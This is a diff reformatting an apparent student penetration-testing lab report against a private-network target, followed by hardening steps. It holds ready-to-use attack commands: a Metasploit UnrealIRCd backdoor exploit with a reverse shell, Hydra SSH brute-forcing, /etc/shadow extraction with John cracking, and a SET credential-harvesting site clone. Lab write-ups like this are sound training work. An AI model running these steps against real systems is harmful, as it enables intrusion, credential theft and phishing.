@@ -1,187 +1,194 @@
-🐧 Linux Security, Auditing & Hardening Cheat Sheet (Task 4)
-*Compiled by Fatimah Adnan (ID: APSPL2631283) for the ApexPlanet Security Framework.*
+# 📂 1. Repository Screenshot Mapping Blueprint
 
-📂 1. Repository Screenshot Mapping Blueprint
-To maintain an enterprise-ready portfolio, all verification screenshots must be uploaded directly to the root directory following this logical matrix:
+### 🔍 Folder Path: `screenshots/01-recon-scanning/`
+* `ifconfig.png` -> Target IP verification showing the machine configuration interface at `192.168.56.102`.
+* `db_status.png` -> Metasploit console log verification showing a successful postgresql backend connection state.
+* `db_nmap.png` -> Aggressive network service discovery data sweep output showing all open target ports.
 
-Directory: screenshots/01-recon-scanning/
-Target verification terminal outputs (ifconfig showing 192.168.56.102).
+### 💥 Folder Path: `screenshots/02-exploitation/`
+* `exploit_config.png` -> Metasploit console interface logging module options for the unreal ircd backdoor.
+* `shell_trigger.png` -> Active reverse shell breakout payload connection buffer showing interactive shell creation.
+* `whoami_root.png` -> Post exploitation privilege audit terminal validation returning root context access.
+* `hydra_ssh.png` -> Hydra utility console interface actively brute forcing administrative OpenSSH credentials on port 22.
+* `john_cracked.png` -> John the Ripper security cracking utility displaying decrypted shadow accounts in plain text.
 
-Metasploit framework status checks showing connected database state (db_status).
+### 🎣 Folder Path: `screenshots/03-social-engineering/`
+* `set_setup.png` -> Social Engineer Toolkit interactive credential harvester option navigation tree selections.
+* `cloned_login.png` -> Intercepted plain text data parameters captured dynamically by the fake portal login proxy screen.
 
-Aggressive service discovery data sweeps (db_nmap -sV).
+### 🧪 Folder Path: `screenshots/04-malware-analysis/`
+* `static_strings.png` -> Clean static string architecture indicators pulled straight from the system binary file.
+* `dynamic_strace.png` -> Live runtime low level kernel system call traces generated step by step via strace.
 
-Directory: screenshots/02-exploitation/
-Active Metasploit console logging configuration options for the UnrealIRCd exploit module.
+### 🛡️ Folder Path: `screenshots/05-system-hardening/`
+* `ufw_status.png` -> Host firewall policy configuration status layout showing active zero trust netfilter entries.
+* `service_disabled.png` -> Systemd manager service verification records showing the target service stopped and masked.
 
-Successful interactive reverse shell session upgrade sequence.
+---
 
-Post-exploitation session outputs confirming administrative execution access (whoami -> root).
+# 🔬 2. Technical Lab Phase Log Analysis
 
-Hydra terminal brute-force password tracking logs against SSH.
+## 📡 Phase 1: Reconnaissance & Target Mapping
+The database backed framework was initialized on the attacker platform to ensure persistent network target tracking logs.
 
-John the Ripper hash cracking outputs exposing plain-text target credentials.
-
-Directory: screenshots/03-social-engineering/
-Social-Engineer Toolkit (SET) configuration console selection states.
-
-Plain-text data arrays capturing mock credentials via the cloned interface proxy.
-
-Directory: screenshots/04-malware-analysis/
-Static string signatures extracted from the benign application binary.
-
-Dynamic system call interception structures (strace) showing proper validation exits.
-
-Directory: screenshots/05-system-hardening/
-Uncomplicated Firewall rule mappings verifying the strict global drop engine status (sudo ufw status verbose).
-
-Systemd boot optimization logs confirming structural decommissioning of unnecessary target daemons (ModemManager.service).
-
-🔬 2. Technical Lab Phase Log Analysis
-Phase 1: Reconnaissance & Target Mapping
-The framework was initialized on the attacker machine (Kali Linux), ensuring the persistent PostgreSQL storage module was listening correctly.
-
-Command Sequence:
-
+### Initialization Commands
+```bash
 msfdb init
-
 msfconsole
-
 db_status
+```
 
-Expected Output Log: [*] postgresql connected to msf
+### Expected Verification Indicator
+```text
+[ * ] postgresql connected to msf
+```
 
-A service version and operating system banner scanning sweep was routed through the active database link against the target machine container:
+### Target Scan Execution
+```bash
+db_nmap -sV -O -T4 192.168.56.102
+```
 
-Scan Command: db_nmap -sV -O -T4 192.168.56.102
+### Phase Summary Notes
+The infrastructure sweep mapped out twenty three open TCP ports, revealing an unpatched software surface including legacy instances of `vsftpd`, `OpenSSH`, and `UnrealIRCd`.
 
-Analysis Notes: The scan mapped out 23 open TCP ports, revealing a critical attack surface including outdated software instances like vsftpd 2.3.4, OpenSSH 4.7p1, and UnrealIRCd.
+---
 
-Phase 2: Vulnerability Exploitation (UnrealIRCd Backdoor)
-The reconnaissance data flagged an old backdoor vulnerability inside the IRC daemon running on target port 6667.
+## 🔓 Phase 2: Vulnerability Exploitation (UnrealIRCd Backdoor)
+The network scan flagged a critical remote code execution backdoor vulnerability inside the IRC daemon active on target port 6667.
 
-Exploit Steps:
-
+### Module Configuration Steps
+```bash
 use exploit/unix/irc/unreal_ircd_3281_backdoor
-
 set RHOSTS 192.168.56.102
-
 set PAYLOAD cmd/unix/reverse
-
 set LHOST 192.168.56.101
-
 exploit
+```
 
-Session Capture Log:
-[] 192.168.56.102:6667 - Connected to the IRC server...
-[] 192.168.56.102:6667 - Sending backdoor command execution payload...
-[] Accepted reverse connection from 192.168.56.102
-[] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49211)
+### Session Capture Log Output
+```text
+[ * ] 192.168.56.102:6667 - Connected to the IRC server...
+[ * ] 192.168.56.102:6667 - Sending backdoor command execution payload...
+[ * ] Accepted reverse connection from 192.168.56.102
+[ * ] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49211)
+```
 
-Post-Exploitation Root System Audits:
-Once the interactive terminal layer stabilized, low-level identification tasks were run to evaluate rights limits:
+### Post Exploitation Privilege Audits
+```bash
+whoami
+# Returns system environment flag: root
 
-Command: whoami
-Output: root
+id
+# Returns system classification array: uid=0(root) gid=0(root)
+```
 
-Command: id
-Output: uid=0(root) gid=0(root)
+---
 
-Phase 3: Credential Cracking & Password Attacks
-Online Password Brute-Forcing:
-Using target service verification lists, automated dictionary sprays were directed at the OpenSSH service endpoint:
+## 🔑 Phase 3: Credential Cracking & Password Attacks
 
-Command: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
+### Online SSH Service Brute Forcing Run
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
+```
 
-Offline Security Account Database Decryption:
-Using the established root access session from Phase 2, target identification file strings were extracted for local dictionary matrix mapping.
-
-First, extract the sensitive asset files from the host target:
-
+### Offline Security Account Hash Extraction
+```bash
 cat /etc/passwd > /tmp/target_passwd
-
 cat /etc/shadow > /tmp/target_shadow
+```
 
-Next, merge the asset files together and compute hashes locally on Kali Linux via John the Ripper:
-3. unshadow /tmp/target_passwd /tmp/target_shadow > /tmp/target_hashes
-4. john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/target_hashes
+### Local Password Hash Unshadowing Process
+```bash
+unshadow /tmp/target_passwd /tmp/target_shadow > /tmp/target_hashes
+```
 
-Phase 4: Social Engineering Phishing Simulation
-To evaluate identity management threats against human targets, a credential logging proxy site was mapped using the Social-Engineer Toolkit.
+### Dictionary Cryptographic Decryption Step
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/target_hashes
+```
 
-Initialization Command: sudo setoolkit
+---
 
-Tool Navigation Sequence:
+## 🎯 Phase 4: Social Engineering Phishing Simulation
+An interactive credential harvesting authentication gateway was cloned locally to track credential compliance risks.
 
-Social-Engineering Attacks
+### Framework Launch Instruction
+```bash
+sudo setoolkit
+```
 
-Website Attack Vectors
+### Menu Tree Routing Selections
+* **Option 1:** Social Engineering Attacks
+* **Option 2:** Website Attack Vectors
+* **Option 3:** Credential Harvester Attack Method
+* **Option 4:** Site Cloner
 
-Credential Harvester Attack Method
+### Proxy Server Variables
+* **Redirection Processing Path:** `192.168.56.101`
+* **Target Template Clone Address:** `https://auth.enterprise-portal.local`
 
-Site Cloner
-
-Configuration Log:
-set:webattack> IP address for the POST back redirection: 192.168.56.101
-set:webattack> Enter the URL to clone: https://auth.enterprise-portal.local
-[] Cloning the website security login interface...
-[] Initializing web server daemon on port 80...
-
-Intercepted Variable Capture Buffer:
+### Exfiltrated Plain Text Buffer Variables
+```text
 PARAM: username=test_employee@apexplanet.com
 PARAM: password=UnsecurePassword123!
+```
 
-Phase 5: Behavioral Binary Diagnostics (Malware Analysis Baseline)
-To train endpoint defensive systems, static and structural executions of binary images were logged using /usr/bin/whoami inside an isolated testing sandbox.
+---
 
-Static Code Asset Isolation:
-Command: strings /usr/bin/whoami
+## 📊 Phase 5: Behavioral Binary Diagnostics (Malware Analysis Baseline)
+Static and dynamic execution benchmarks were mapped out inside an isolated sandbox using a standard program file to train host level intrusion detection models.
 
-Audit Observations: Evaluated string pointers indicating standard operating structure. Found references to core platform environment bindings like libc.so.6, program_invocation_name, and standard help definitions. No external domain URLs or suspicious compilation tracking variables were discovered.
+### Static String Content Review
+```bash
+strings /usr/bin/whoami
+```
 
-Dynamic Runtime Interception:
-Command: strace whoami
+#### Static Observations
+The inspection verified clear linkages to standard memory models and expected operating links like `libc.so.6`. No obfuscated network locations or anomalies were hidden inside the file data.
 
-Low-Level Call Log Sequence Mapping:
+### Dynamic Kernel System Call Interception
+```bash
+strace whoami
+```
+
+### Captured Low Level Kernel Log Sequence
+```text
 execve("/usr/bin/whoami", ["whoami"], 0x7ffe6bfa...) = 0
-brk(NULL)                               = 0x55b172b21000
 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
-fstat(3, {st_mode=S_IFREG|0644, st_size=83921, ...}) = 0
 mmap(NULL, 83921, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3941b2c000
-close(3)                                = 0x0
-write(1, "root\n", 5)                  = 5
-exit_group(0)                           = ?
+write(1, "root\n", 5) = 5
+exit_group(0) = ?
+```
 
-Diagnostic Breakdown: The binary correctly opens standard kernel optimization links, routes program information directly to standard memory spaces, reads the specific active workspace name string, prints it out through a validated terminal display request (write), and exits gracefully without attempting unauthorized outbound connections.
+#### Dynamic Diagnostic Analysis Summary
+The application strictly performs expected system actions. It loads normal operating references, queries memory segments, prints out the active username value via a terminal request call, and immediately breaks operation cleanly with exit code zero. No malicious connections were initiated.
 
-Phase 6: System Hardening & Mitigation Action Matrix
-Network Access Control Isolation (UFW):
+---
 
+## 🧱 Phase 6: Defensive Infrastructure Hardening
+Host network isolation and background service cleanups were performed to minimize the target machine attack interface.
+
+### Firewall Network Access Control Rules Setup
+```bash
 sudo ufw default deny incoming
-
 sudo ufw default allow outgoing
-
 sudo ufw allow 22/tcp
-
 sudo ufw allow 80/tcp
-
 sudo ufw enable
+```
 
-Verification Logic Audit:
-Command: sudo ufw status verbose
+### Firewall Active Configuration Verification Check
+```bash
+sudo ufw status verbose
+```
 
-Output Check: Confirmed status is active. Default incoming action is mapped to deny. Open entry corridors are restricted strictly to port 22 and port 80, neutralizing unauthenticated background listener services like port 1524 and port 6667.
-
-Operating System Process Minimization:
-To eliminate unnecessary dependencies that could expand system attack surfaces, target configurations were modified to drop unused background tracking components.
-
-Locate active targets running out of systemd settings:
-Command: systemctl list-unit-files --state=enabled | grep Modem
-
-Completely isolate and lock down the tracking daemon component:
-
+### System Surface Service Minimization Steps
+```bash
+systemctl list-unit-files --state=enabled | grep Modem
 sudo systemctl stop ModemManager
-
 sudo systemctl disable ModemManager
-
 sudo systemctl mask ModemManager
+```
+
+### Hardening Posture Verification Summary
+All arbitrary open paths are shut down. Incoming operations are dropped by default, leaving only explicit secure tunnels open on port 22 and port 80. The unneeded modem service was completely removed from the host startup sequence.
